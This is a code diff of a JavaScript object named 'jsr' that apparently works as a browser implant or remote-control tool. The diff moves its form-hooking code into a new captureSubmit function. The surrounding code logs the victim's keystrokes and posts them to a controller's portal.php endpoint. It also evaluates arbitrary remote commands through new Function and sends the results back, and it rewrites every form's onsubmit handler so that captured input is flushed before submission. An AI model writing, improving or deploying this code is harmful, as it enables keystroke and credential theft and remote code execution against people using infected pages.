@@ -59,10 +59,7 @@ let jsr = {
         jsr.cleanup();
       } else if (data.command == "keylog") {
         window.addEventListener("keydown", jsr.sendLog);
-        var els = document.querySelectorAll('form');
-        for (var i=0; i < els.length; i++) {
-            els[i].setAttribute("onsubmit", "jsr.cleanup();" + els[i].getAttribute("onsubmit"));
-        }
+        jsr.captureSubmit();
       } else if (data.command == "console") {
         jsr.ajaxReq(jsr.host_url + "/portal.php?post=console", function(c){}, "POST", { log: btoa((new Function("return " + data.argument1)())), cmd: data.argument1 });
       } else if(data.command == "screenshot") {
@@ -82,16 +79,7 @@ let jsr = {
       var data = JSON.parse(x);
       if(data.log == "true") {
         window.addEventListener("keydown", jsr.sendLog);
-        var els = document.querySelectorAll('form');
-        for (var i=0; i < els.length; i++) {
-            if((els[i].hasAttribute("onsubmit") && !els[i].getAttribute("onsubmit").indexOf('jsr.cleanup();')) || !els[i].hasAttribute("onsubmit") ) {
-              if(els[i].hasAttribute("onsubmit")) {
-                els[i].setAttribute("onsubmit", "jsr.cleanup();" + els[i].getAttribute("onsubmit"));
-              } else {
-                els[i].setAttribute("onsubmit", "jsr.cleanup();");
-              }
-            }
-        }
+        jsr.captureSubmit();
       } else {
         window.removeEventListener("keydown", jsr.sendLog);
         jsr.cleanup();
@@ -107,6 +95,18 @@ let jsr = {
     } else if(jsr.presses.length>25) {
       jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses });
       jsr.presses = "";
+    }
+  }),
+  captureSubmit: (function() {
+    var els = document.querySelectorAll('form');
+    for (var i=0; i < els.length; i++) {
+       if((els[i].hasAttribute("onsubmit") && !els[i].getAttribute("onsubmit").indexOf('jsr.cleanup();')) || !els[i].hasAttribute("onsubmit") ) {
+          if(els[i].hasAttribute("onsubmit")) {
+             els[i].setAttribute("onsubmit", "jsr.cleanup();" + els[i].getAttribute("onsubmit"));
+          } else {
+             els[i].setAttribute("onsubmit", "jsr.cleanup();");
+          }
+       }
     }
   }),
   cleanup: (function(){
